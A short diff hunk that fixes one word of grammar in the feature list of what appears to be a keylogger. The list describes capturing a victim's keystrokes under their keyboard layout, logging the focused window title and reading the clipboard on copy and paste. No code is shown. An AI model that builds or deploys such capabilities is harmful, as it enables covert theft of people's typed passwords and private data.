@@ -18,7 +18,7 @@
 	e.g: if the victim uses a US keyboard layout and press SHIFT+2, the keylogger will read the correct
 		 character (@).
 		 if the victim uses a IT keyboard layout, the keylogger will catch (")
-	{*} Write to the log also the focused window title
+	{*} Writes to the log also the focused window title
 	{*} Reads the clipboard when CTRL+C and CTRL+V are pressed (No "Copy" mouse support)
 	
 	[HOW TO SETUP]
